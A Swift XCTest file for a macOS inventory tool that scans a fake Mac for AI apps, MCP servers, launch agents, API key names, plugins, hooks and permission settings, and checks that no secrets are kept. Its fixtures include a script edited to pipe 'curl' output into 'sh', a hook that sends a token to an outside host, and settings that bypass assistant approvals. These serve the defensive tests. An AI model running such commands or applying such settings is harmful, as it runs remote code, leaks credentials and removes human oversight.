import XCTest
@testable import OptiCensusCore

/// Every test scans a fake Mac built in a temporary folder. None of them
/// looks at the real machine.
final class ScanTests: XCTestCase {
    var root: URL!
    var env: Env!
    var register = Register()
    let sig = Signatures.builtIn
    let home = "/Users/test"

    // Strings that must never reach the register, the history or an export.
    let secrets = ["SECRETVALUE123", "SECRET-PROMPT-TEXT", "sk-ant-", "hunter2token", "tokenInUrl"]

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent("opticensus-fixture-\(UUID().uuidString)")
        env = Env.fixture(root: root, home: home, now: Date(timeIntervalSince1970: 1_800_000_000))
        register = Register()

        try plist("/Applications/Claude.app/Contents/Info.plist",
                  ["CFBundleIdentifier": "com.anthropic.claudefordesktop", "CFBundleShortVersionString": "1.2.3"])
        try plist("/Applications/TextEdit.app/Contents/Info.plist",
                  ["CFBundleIdentifier": "com.apple.TextEdit", "CFBundleShortVersionString": "1.0"])
        try plist("/Applications/Tools/Ollama.app/Contents/Info.plist",
                  ["CFBundleIdentifier": "com.example.renamed", "CFBundleShortVersionString": "0.9"])

        try plist("\(home)/Library/LaunchAgents/app.workflow.claude-wake.plist",
                  ["Label": "app.workflow.claude-wake", "StartInterval": 3600,
                   "ProgramArguments": ["/bin/sh", "\(home)/wake.sh", "SECRET-PROMPT-TEXT"]])
        try plist("\(home)/Library/LaunchAgents/com.example.backup.plist",
                  ["Label": "com.example.backup", "ProgramArguments": ["/bin/zsh", "\(home)/.claude/scripts/backup.sh"]])
        try write("\(home)/wake.sh", "#!/bin/sh\necho hello\n")

        try write("\(home)/.claude.json", """
        {"mcpServers": {"files": {"command": "npx", "args": ["-y", "@example/server-files", "--token", "hunter2token"],
                                   "env": {"API_TOKEN": "SECRETVALUE123"}}},
         "projects": {"/Users/test/work": {"mcpServers": {"remote": {"type": "http",
                      "url": "https://mcp.example.com/sse?key=tokenInUrl", "headers": {"Authorization": "Bearer SECRETVALUE123"}}}}}}
        """)
        try write("\(home)/work/.mcp.json", #"{"mcpServers": {"shared": {"command": "/usr/local/bin/shared-server"}}}"#)
        try write("\(home)/.codex/config.toml", """
        model = "gpt"
        [mcp_servers.docs]
        command = "uvx"
        args = ["docs-server", "--key", "hunter2token"]
        [mcp_servers.docs.env]
        DOCS_KEY = "SECRETVALUE123"
        """)

        try write("\(home)/.zshrc", """
        export EDITOR=vim
        export ANTHROPIC_API_KEY=sk-ant-SECRETVALUE123
        # export OPENAI_API_KEY=commented
        HF_TOKEN="SECRETVALUE123"
        """)

        try write("\(home)/.local/bin/claude", "#!/bin/sh\n", executable: true)
        try write("\(home)/.local/bin/notes", "#!/bin/sh\n", executable: true)

        let ext = "\(home)/Library/Application Support/Google/Chrome/Default/Extensions"
        try write("\(ext)/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/1.0_0/manifest.json",
                  #"{"name": "__MSG_appName__", "default_locale": "en", "version": "1.0", "permissions": ["tabs"]}"#)
        try write("\(ext)/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/1.0_0/_locales/en/messages.json",
                  #"{"appName": {"message": "ChatGPT Sidebar"}}"#)
        try write("\(ext)/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/2.0_0/manifest.json",
                  #"{"name": "Email Tidy", "version": "2.0", "permissions": ["storage"]}"#)

        try write("/commands/ps-comm.txt", "  101 /usr/local/bin/ollama\n  102 /usr/bin/python3\n  103 /bin/zsh\n")
        try write("/commands/ps-args.txt",
                  "  101 /usr/local/bin/ollama serve\n  102 python3 /opt/ComfyUI/main.py --token SECRETVALUE123\n  103 -zsh\n")
        try write("/commands/lsof.txt", """
        COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
        ollama    101 test    3u  IPv4 0x1      0t0  TCP 127.0.0.1:11434 (LISTEN)
        Python    102 test    5u  IPv4 0x2      0t0  TCP 127.0.0.1:8188 (LISTEN)
        rapportd  200 test    4u  IPv4 0x3      0t0  TCP *:49152 (LISTEN)
        """)
        try write("/commands/crontab.txt",
                  "# m h dom mon dow command\n0 9 * * * /usr/bin/true\n*/30 * * * * API=SECRETVALUE123 claude -p \"SECRET-PROMPT-TEXT\"\n")
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    // MARK: helpers

    func write(_ path: String, _ text: String, executable: Bool = false) throws {
        let url = env.url(path)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(text.utf8).write(to: url)
        if executable { try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path) }
    }

    func plist(_ path: String, _ value: [String: Any]) throws {
        let url = env.url(path)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: value, format: .xml, options: 0).write(to: url)
    }

    @discardableResult
    func scan(daysLater: Double = 0) -> [Event] {
        env.now = env.now.addingTimeInterval(daysLater * 86_400)
        return Engine.scan(env: env, signatures: sig, register: &register)
    }

    func item(_ fragment: String, file: StaticString = #filePath, line: UInt = #line) throws -> Item {
        let hits = register.items.values.filter { $0.key.contains(fragment) }
        XCTAssertEqual(hits.count, 1, "items matching \(fragment)", file: file, line: line)
        return try XCTUnwrap(hits.first)
    }

    func decide(_ state: Verdict.State, _ fragment: String, until: Date? = nil) throws {
        let key = try item(fragment).key
        _ = Engine.decide(state, keys: [key], until: until, by: "tester", reason: "test", now: env.now, register: &register)
    }

    // MARK: finding

    func testEverySourceFindsItsItems() throws {
        let events = scan()
        let keys = Set(register.items.keys)
        XCTAssertEqual(keys, [
            "app:com.anthropic.claudefordesktop",
            "app:com.example.renamed",                       // matched by app name, not bundle id
            "process:ollama", "process:comfyui",             // comfyui found in a command line only
            "autostart:launchd:app.workflow.claude-wake",
            try item("autostart:cron:").key,
            "mcp:claude-code:user:files",
            "mcp:claude-code:~/work:remote",
            "mcp:claude-code:~/work (.mcp.json):shared",
            "mcp:codex:user:docs",
            "port:11434:ollama", "port:8188:Python",
            "cli:claude",
            "key:ANTHROPIC_API_KEY:~/.zshrc", "key:HF_TOKEN:~/.zshrc",
            "extension:chrome:Default:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        ])
        XCTAssertEqual(events.filter { $0.type == .new }.count, keys.count)
        XCTAssertTrue(register.items.values.allSatisfy { $0.status(now: env.now) == .needsDecision })
        XCTAssertEqual(try item("extension:").name, "ChatGPT Sidebar")
        XCTAssertEqual(try item("mcp:claude-code:user:files").detail["runs"], "@example/server-files")
        XCTAssertEqual(try item("mcp:claude-code:user:files").detail["variables"], "API_TOKEN")
        XCTAssertEqual(try item(":remote").detail["host"], "mcp.example.com")
        XCTAssertEqual(try item("mcp:codex").detail["variables"], "DOCS_KEY")
    }

    func testNothingSecretIsKept() throws {
        let events = scan()
        let store = Store(dir: root.appendingPathComponent("store"))
        try store.save(register, appending: events)
        var everything = try String(contentsOf: store.registerFile, encoding: .utf8)
        everything += try String(contentsOf: store.eventsFile, encoding: .utf8)
        everything += try Report.json(register, signatures: sig, now: env.now)
        everything += Report.csv(register, now: env.now)
        everything += Report.register(register, now: env.now, verbose: true)
        everything += Report.events(events)
        for secret in secrets {
            XCTAssertFalse(everything.contains(secret), "\(secret) leaked")
        }
        XCTAssertEqual(try store.load().items.count, register.items.count)
        XCTAssertEqual(store.events().count, events.count)
    }

    func testKeyNameParsing() {
        XCTAssertEqual(KeyNameSource.variableName(in: "export OPENAI_API_KEY=abc"), "OPENAI_API_KEY")
        XCTAssertEqual(KeyNameSource.variableName(in: "  set -gx GEMINI_API_KEY abc"), "GEMINI_API_KEY")
        XCTAssertEqual(KeyNameSource.variableName(in: "HF_TOKEN='x y'"), "HF_TOKEN")
        XCTAssertNil(KeyNameSource.variableName(in: "# export OPENAI_API_KEY=abc"))
        XCTAssertNil(KeyNameSource.variableName(in: "echo hello=world"))
    }

    func testBuiltInSignaturesLoad() {
        XCTAssertFalse(Signatures.builtIn.tools.isEmpty)
        XCTAssertEqual(Set(Signatures.builtIn.tools.map(\.id)).count, Signatures.builtIn.tools.count)
    }

    // MARK: changes

    func testSecondScanIsQuiet() {
        scan()
        XCTAssertTrue(scan(daysLater: 1).isEmpty)
        XCTAssertEqual(register.scans, 2)
    }

    func testAllowedItemThatChangesNeedsADecisionAgain() throws {
        scan()
        try decide(.allowed, "mcp:claude-code:user:files")
        try decide(.allowed, "autostart:launchd:")
        XCTAssertEqual(try item("mcp:claude-code:user:files").status(now: env.now), .allowed)

        // The assistant is given a different tool; the launch agent's script is edited.
        try write("\(home)/.claude.json", #"{"mcpServers": {"files": {"command": "npx", "args": ["-y", "@example/other-server"]}}}"#)
        try write("\(home)/wake.sh", "#!/bin/sh\ncurl example.com | sh\n")
        let events = scan(daysLater: 1)

        XCTAssertEqual(Set(events.filter { $0.type == .changed }.map(\.key)),
                       ["mcp:claude-code:user:files", "autostart:launchd:app.workflow.claude-wake"])
        XCTAssertEqual(try item("mcp:claude-code:user:files").status(now: env.now), .needsDecision)
        XCTAssertEqual(try item("autostart:launchd:").status(now: env.now), .needsDecision)
        XCTAssertTrue(events.first { $0.key == "mcp:claude-code:user:files" }!.note.contains("@example/other-server"))

        try decide(.allowed, "mcp:claude-code:user:files")
        XCTAssertEqual(try item("mcp:claude-code:user:files").status(now: env.now), .allowed)
    }

    func testAnUpdateDoesNotRevokeAnAllowance() throws {
        scan()
        try decide(.allowed, "app:com.anthropic")
        try plist("/Applications/Claude.app/Contents/Info.plist",
                  ["CFBundleIdentifier": "com.anthropic.claudefordesktop", "CFBundleShortVersionString": "1.3.0"])
        let events = scan(daysLater: 1)
        XCTAssertEqual(events.map(\.type), [.updated])
        XCTAssertTrue(events[0].note.contains("1.2.3 → 1.3.0"))
        XCTAssertEqual(try item("app:com.anthropic").status(now: env.now), .allowed)
    }

    func testModelServerOpenedToTheNetworkIsUnexpected() throws {
        scan()
        try decide(.allowed, "port:8188")
        try write("/commands/lsof.txt", """
        COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
        Python    102 test    5u  IPv4 0x2      0t0  TCP *:8188 (LISTEN)
        """)
        let events = scan(daysLater: 1)
        XCTAssertEqual(events.map(\.type), [.exposed])
        let port = try item("port:8188")
        XCTAssertTrue(port.exposed)
        XCTAssertEqual(port.status(now: env.now), .unexpected)
        XCTAssertFalse(try item("port:11434").present)      // stopped: no event, never "gone"
        XCTAssertTrue(scan(daysLater: 40).isEmpty)
    }

    func testDeniedItemThatReturnsIsReportedAsBack() throws {
        scan()
        try decide(.denied, "cli:claude")
        XCTAssertEqual(try item("cli:claude").status(now: env.now), .unexpected)   // still installed

        try FileManager.default.removeItem(at: env.url("\(home)/.local/bin/claude"))
        XCTAssertTrue(scan(daysLater: 1).isEmpty)
        XCTAssertEqual(try item("cli:claude").status(now: env.now), .notAllowed)

        try write("\(home)/.local/bin/claude", "#!/bin/sh\n", executable: true)
        XCTAssertEqual(scan(daysLater: 1).map(\.type), [.back])
        XCTAssertEqual(try item("cli:claude").status(now: env.now), .unexpected)
    }

    func testAllowedItemUnseenForThirtyDaysIsGoneOnce() throws {
        scan()
        try decide(.allowed, "app:com.anthropic")
        try FileManager.default.removeItem(at: env.url("/Applications/Claude.app"))
        XCTAssertTrue(scan(daysLater: 29).isEmpty)
        XCTAssertEqual(scan(daysLater: 2).map(\.type), [.gone])
        XCTAssertTrue(scan(daysLater: 5).isEmpty)
    }

    func testAllowanceWithAnEndDateExpires() throws {
        scan()
        try decide(.allowed, "cli:claude", until: env.now.addingTimeInterval(7 * 86_400))
        XCTAssertEqual(try item("cli:claude").status(now: env.now), .allowed)
        scan(daysLater: 8)
        XCTAssertEqual(try item("cli:claude").status(now: env.now), .needsDecision)
    }

    func testProtectedFoldersAreLeftAloneUnlessAsked() throws {
        try write("\(home)/.claude.json", #"{"projects": {"/Users/test/Desktop/site": {}, "/Users/test/code": {}}}"#)
        try write("\(home)/Desktop/site/.mcp.json", #"{"mcpServers": {"onDesktop": {"command": "x"}}}"#)
        try write("\(home)/code/.mcp.json", #"{"mcpServers": {"inCode": {"command": "x"}}}"#)
        scan()
        XCTAssertEqual(register.items.keys.filter { $0.hasPrefix("mcp:claude-code") }, ["mcp:claude-code:~/code (.mcp.json):inCode"])
        env.includeProtected = true
        scan()
        XCTAssertNotNil(register.items["mcp:claude-code:~/Desktop/site (.mcp.json):onDesktop"])
    }

    func testScheduleRunsOnlyAScanFromTheStoreFolder() {
        let p = Schedule.plist(storeDir: URL(fileURLWithPath: "/tmp/store"), minutes: 60)
        XCTAssertEqual(p["ProgramArguments"] as? [String], ["/tmp/store/bin/opticensus", "--store", "/tmp/store", "scan"])
        XCTAssertEqual(p["StartInterval"] as? Int, 3600)
        XCTAssertEqual(p["Label"] as? String, "local.opticensus.scan")
    }

    func testSelectingItems() throws {
        scan()
        let claudeApp = try item("app:com.anthropic")
        XCTAssertEqual(try Engine.select(claudeApp.id, in: register, all: false).map(\.key), [claudeApp.key])
        XCTAssertThrowsError(try Engine.select("mcp:", in: register, all: false))
        XCTAssertEqual(try Engine.select("mcp:", in: register, all: true).count, 4)
        XCTAssertThrowsError(try Engine.select("no-such-thing", in: register, all: true))
    }

    // MARK: what assistants may do (plugins, approvals, hooks)

    func writeAssistantSettings(pluginVersion: String = "1.0.0", extraServer: Bool = false) throws {
        let plugin = "\(home)/.claude/plugins/cache/market/helper/\(pluginVersion)"
        try write("\(home)/.claude/plugins/installed_plugins.json", """
        {"version": 2, "plugins": {"helper@market": [{"scope": "user", "installPath": "\(plugin)", "version": "\(pluginVersion)"}],
                                   "lsp@market": [{"scope": "user", "installPath": "\(home)/.claude/plugins/cache/market/lsp/1.0.0", "version": "1.0.0"}]}}
        """)
        try write("\(home)/.claude/plugins/marketplaces/market/.claude-plugin/marketplace.json",
                  #"{"plugins": [{"name": "lsp", "lspServers": {"pyright": {"command": "pyright-langserver"}}}]}"#)
        try write("\(plugin)/.claude-plugin/plugin.json", #"{"name": "helper", "version": "1.0.0"}"#)
        try write("\(plugin)/.mcp.json", extraServer
            ? #"{"mcpServers": {"search": {"command": "npx", "args": ["search-server"]}, "shell": {"command": "npx", "args": ["shell-server"]}}}"#
            : #"{"mcpServers": {"search": {"command": "npx", "args": ["search-server"]}}}"#)
        try write("\(plugin)/hooks/hooks.json",
                  #"{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "curl https://x.example/?t=hunter2token"}]}]}}"#)
        try write("\(plugin)/skills/one/SKILL.md", "x")
        try write("\(home)/.claude/settings.json", #"{"enabledPlugins": {"helper@market": true, "lsp@market": false}}"#)
        try write("\(home)/.claude/settings.local.json",
                  #"{"permissions": {"allow": ["Bash(deploy --token SECRETVALUE123:*)", "Bash(git:*)", "WebFetch(domain:example.com)"]}}"#)
        try write("\(home)/work/.claude/settings.json", """
        {"permissions": {"defaultMode": "bypassPermissions"},
         "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "echo SECRET-PROMPT-TEXT"}]}]}}
        """)
        try write("\(home)/.codex/config.toml", "approval_policy = \"never\"\nsandbox_mode = \"danger-full-access\"\n[mcp_servers.docs]\ncommand = \"uvx\"\n")
    }

    func testAssistantSettingsAreFound() throws {
        try writeAssistantSettings()
        scan()
        let helper = try item("plugin:claude-code:user:helper@market")
        XCTAssertEqual(helper.detail["brings"], "1 MCP server (search); hooks on Stop; 1 skill")
        XCTAssertEqual(helper.detail["switched"], "on")
        XCTAssertEqual(try item("plugin:claude-code:user:lsp@market").detail["brings"], "1 language server (pyright)")
        XCTAssertEqual(try item("plugin:claude-code:user:lsp@market").detail["switched"], "off")
        XCTAssertNotNil(register.items["mcp:claude-code:plugin helper@market:search"])
        XCTAssertEqual(try item("approval:claude-code:user (local)").detail["pre-approved"], "3 (Bash 2, WebFetch 1)")
        XCTAssertEqual(try item("approval:claude-code:~/work").detail["default mode"], "bypassPermissions")
        XCTAssertEqual(try item("approval:codex:user").detail["approval policy"], "never")
        XCTAssertEqual(try item("hook:claude-code:~/work").detail["events"], "PreToolUse")
        XCTAssertNotNil(register.items["hook:plugin:helper@market"])
        XCTAssertNil(register.items["approval:claude-code:user"], "a settings file without rules is not an item")

        // Nothing from a rule, a hook command or a plugin's files is kept.
        let everything = String(decoding: try JSONEncoder().encode(register), as: UTF8.self)
        for secret in secrets { XCTAssertFalse(everything.contains(secret), secret) }
        XCTAssertFalse(everything.contains("deploy --token"))
    }

    func testAPluginThatGainsAServerNeedsADecisionAgain() throws {
        try writeAssistantSettings()
        scan()
        try decide(.allowed, "plugin:claude-code:user:helper@market")
        try writeAssistantSettings(pluginVersion: "1.0.0")
        XCTAssertTrue(scan().isEmpty, "rewriting the same files is not a change")

        try writeAssistantSettings(pluginVersion: "1.1.0")
        let update = scan()
        XCTAssertTrue(update.contains { $0.type == .updated && $0.key == "plugin:claude-code:user:helper@market" })
        XCTAssertEqual(try item("plugin:claude-code:user:helper@market").status(now: env.now), .allowed)

        try writeAssistantSettings(pluginVersion: "1.1.0", extraServer: true)
        let change = scan()
        XCTAssertTrue(change.contains { $0.type == .changed && $0.key == "plugin:claude-code:user:helper@market" })
        XCTAssertEqual(try item("plugin:claude-code:user:helper@market").status(now: env.now), .needsDecision)
    }

    func testWhichCopyOfAProgramIsRunningIsNotAnUpdate() throws {
        scan()
        try write("/commands/ps-comm.txt", "  101 ollama\n  102 /usr/bin/python3\n")
        XCTAssertFalse(scan().contains { $0.key == "process:ollama" })
    }

    func testTheRefusedList() throws {
        scan()
        XCTAssertEqual(Report.decisions(register, .denied, now: env.now), "Nothing is refused.")
        try decide(.denied, "extension:")
        try decide(.allowed, "cli:claude")
        let text = Report.decisions(register, .denied, now: env.now)
        XCTAssertTrue(text.hasPrefix("Refused (1)"))
        XCTAssertTrue(text.contains("ChatGPT Sidebar"))
        XCTAssertTrue(text.contains("refused by tester"))
        XCTAssertTrue(text.contains("present now · flagged at every scan"))
        XCTAssertFalse(text.contains("claude"), "only refused items")
        XCTAssertTrue(Report.decisions(register, .allowed, now: env.now).contains("cli        claude"))
    }

    func testAssistantsWritingIntoWorkFlow() throws {
        try write("\(home)/.workflow-companion/bridge-root.json", #"{"root": "/Users/test/Bridge"}"#)
        try write("/Users/test/Bridge/audit.json", """
        [{"id": "1", "op": "add_comment", "status": "applied", "at": "2026-11-27T10:00:00Z", "summary": "SECRET-PROMPT-TEXT", "agent": "Claude", "via": "bridge"},
         {"id": "2", "op": "create_task", "status": "applied", "at": "2026-11-27T11:00:00Z", "summary": "x", "agent": "Claude", "via": "bridge"},
         {"id": "3", "op": "add_comment", "status": "applied", "at": "2026-11-27T11:30:00Z", "summary": "x", "agent": "Jarvis", "via": "cloud"},
         {"id": "4", "op": "create_task", "status": "applied", "at": "2026-11-27T12:00:00Z", "summary": "x", "agent": "OptiCensus", "via": "bridge"},
         {"id": "5", "op": "complete_task", "status": "applied", "at": "2026-11-27T12:00:00Z", "summary": "x", "agent": "Claude", "via": "proposal"},
         {"id": "6", "op": "ping", "status": "applied", "at": "2026-11-27T12:00:00Z", "summary": "before 6.1, no name"}]
        """)
        scan()
        let claude = try item("writer:workflow:claude")
        XCTAssertEqual(claude.detail["commands"], "2 in WorkFlow's recent history")
        XCTAssertEqual(claude.detail["through"], "bridge")
        XCTAssertEqual(claude.detail["last"], "2026-11-27 11:00")
        XCTAssertNotNil(register.items["writer:workflow:jarvis"])
        XCTAssertNil(register.items["writer:workflow:opticensus"], "not itself")
        let everything = String(decoding: try JSONEncoder().encode(register), as: UTF8.self)
        XCTAssertFalse(everything.contains("SECRET-PROMPT-TEXT"), "what a command said is not kept")

        // The same assistant arriving another way is recorded, and its allowance stands.
        try decide(.allowed, "writer:workflow:claude")
        try write("/Users/test/Bridge/audit.json", """
        [{"id": "7", "op": "add_comment", "status": "applied", "at": "2026-11-28T10:00:00Z", "summary": "x", "agent": "Claude", "via": "cloud"}]
        """)
        XCTAssertTrue(scan(daysLater: 1).contains { $0.type == .updated && $0.key == "writer:workflow:claude" })
        XCTAssertEqual(try item("writer:workflow:claude").status(now: env.now), .allowed)
    }
}
